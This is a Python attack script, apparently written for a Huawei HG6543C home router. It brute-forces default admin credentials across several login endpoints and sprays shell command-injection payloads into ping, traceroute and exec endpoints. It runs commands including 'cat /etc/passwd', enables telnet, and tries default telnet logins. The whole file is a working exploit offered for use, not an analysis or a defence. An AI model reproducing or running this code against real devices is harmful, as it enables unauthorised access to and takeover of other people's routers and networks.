#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Huawei HG6543C Manual Exploit
"""

import requests
import socket
import time
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    console = Console()
except:
    console = None

def print_msg(msg, style="white"):
    if console:
        console.print(f"[{style}]{msg}[/{style}]")
    else:
        print(msg)

class HuaweiHG6543CExploit:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.base_url = f"http://{target}:{port}"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        })
        self.logged_in = False

    def try_login(self):
        """Try multiple login methods for Huawei HG6543C"""
        print_msg("🔐 Attempting to login to Huawei HG6543C...", "yellow")
        
        # Huawei HG6543C specific credentials
        credentials = [
            ("admin", "admin"),
            ("Admin", "admin"),
            ("user", "user"), 
            ("root", "admin"),
            ("admin", "Admin@huawei"),
            ("admin", "Huawei12#"),
            ("admin", "Huawei@123"),
            ("telecomadmin", "admintelecom"),
            ("support", "support"),
            ("operator", "operator")
        ]
        
        login_endpoints = [
            "/login.cgi",
            "/cgi-bin/login.cgi", 
            "/api/system/user_login",
            "/cgi-bin/luci",
            "/"
        ]
        
        for username, password in credentials:
            print_msg(f"Trying: {username}:{password}", "cyan")
            
            for endpoint in login_endpoints:
                try:
                    url = f"{self.base_url}{endpoint}"
                    
                    # Try JSON login
                    payload = {
                        "username": username,
                        "password": password,
                        "action": "login"
                    }
                    
                    r = self.session.post(url, json=payload, timeout=10)
                    if r.status_code == 200 and "success" in r.text.lower():
                        self.logged_in = True
                        print_msg(f"✅ LOGIN SUCCESS! {username}:{password}", "green")
                        return True
                    
                    # Try form data login
                    payload = {
                        "Username": username,
                        "Password": password,
                        "Login": "Login"
                    }
                    
                    r = self.session.post(url, data=payload, timeout=10)
                    if r.status_code == 200:
                        # Check if redirected away from login
                        if "login" not in r.url and "logout" in r.text.lower():
                            self.logged_in = True
                            print_msg(f"✅ LOGIN SUCCESS! {username}:{password}", "green")
                            return True
                            
                except Exception as e:
                    continue
        
        print_msg("❌ All login attempts failed", "red")
        return False

    def exploit_rce(self, cmd="id"):
        """Exploit command injection vulnerabilities"""
        if not self.logged_in:
            print_msg("Need login first for RCE", "red")
            return False
            
        print_msg(f"💥 Attempting RCE with command: {cmd}", "yellow")
        
        # Common RCE endpoints for Huawei routers
        endpoints = [
            ("/cgi-bin/ping.cgi", "ping_addr"),
            ("/cgi-bin/tracert.cgi", "tracert_addr"), 
            ("/cgi-bin/diagnostics.cgi", "diagnostics"),
            ("/api/system/exec", "command"),
            ("/cgi-bin/luci/admin/system/exec", "command"),
            ("/goform/exec", "cmd"),
            ("/goform/formPing", "ping_address")
        ]
        
        # Command injection payloads
        payloads = [
            f"127.0.0.1; {cmd}",
            f"127.0.0.1 && {cmd}",
            f"127.0.0.1 | {cmd}",
            f"`{cmd}`",
            f"$({cmd})",
            f";{cmd};",
            f"|{cmd}|",
            f"||{cmd}||"
        ]
        
        for endpoint, param in endpoints:
            for payload in payloads:
                try:
                    url = f"{self.base_url}{endpoint}"
                    data = {param: payload}
                    
                    print_msg(f"Trying: {endpoint} -> {payload}", "dim")
                    
                    r = self.session.post(url, data=data, timeout=10)
                    
                    # Check for command output
                    if any(indicator in r.text for indicator in ["uid=", "root", "bin/", "www-data", "Linux"]):
                        print_msg(f"🎯 RCE SUCCESS at {endpoint}!", "green")
                        print_msg("Command Output:", "yellow")
                        print(r.text)
                        return True
                        
                except Exception as e:
                    continue
        
        print_msg("❌ RCE attempts failed", "red")
        return False

    def enable_telnet(self):
        """Enable telnet service"""
        if not self.logged_in:
            print_msg("Need login first for telnet", "red")
            return False
            
        print_msg("🔧 Enabling telnet service...", "yellow")
        
        endpoints = [
            "/cgi-bin/telnet.cgi",
            "/api/telnet/enable",
            "/cgi-bin/luci/admin/telnet",
            "/goform/telnet"
        ]
        
        for endpoint in endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                data = {"telnet": "1", "enable": "1"}
                
                r = self.session.post(url, data=data, timeout=10)
                if r.status_code == 200:
                    print_msg(f"✅ Telnet enable sent to {endpoint}", "green")
                    return True
                    
            except Exception as e:
                continue
                
        return False

    def connect_telnet(self):
        """Connect to telnet"""
        print_msg("🔌 Connecting to telnet...", "yellow")
        
        try:
            tn = socket.socket()
            tn.settimeout(10)
            tn.connect((self.target, 23))
            
            # Try common credentials
            creds = [("root", "admin"), ("admin", "admin"), ("user", "user")]
            
            for user, pwd in creds:
                try:
                    tn.send(f"{user}\n".encode())
                    time.sleep(1)
                    tn.send(f"{pwd}\n".encode())
                    time.sleep(2)
                    
                    tn.send(b"id\n")
                    time.sleep(1)
                    
                    output = tn.recv(4096).decode()
                    if "uid=" in output:
                        print_msg(f"✅ Telnet access with {user}:{pwd}", "green")
                        print(output)
                        tn.close()
                        return True
                        
                except:
                    continue
                    
            tn.close()
            
        except Exception as e:
            print_msg(f"Telnet failed: {e}", "red")
            
        return False

def main():
    target = "192.168.1.1"  # Ganti dengan IP router kamu jika berbeda
    
    print_msg("🚀 Huawei HG6543C Exploit", "bold red")
    print_msg(f"Target: {target}", "yellow")
    
    exploit = HuaweiHG6543CExploit(target)
    
    # Step 1: Login
    if exploit.try_login():
        # Step 2: RCE
        exploit.exploit_rce("id")
        exploit.exploit_rce("uname -a")
        exploit.exploit_rce("cat /etc/passwd")
        
        # Step 3: Telnet
        exploit.enable_telnet()
        time.sleep(5)
        exploit.connect_telnet()
    else:
        print_msg("Trying unauthenticated RCE...", "yellow")
        # Try without login
        exploit.exploit_rce("id")

if __name__ == "__main__":
    main()
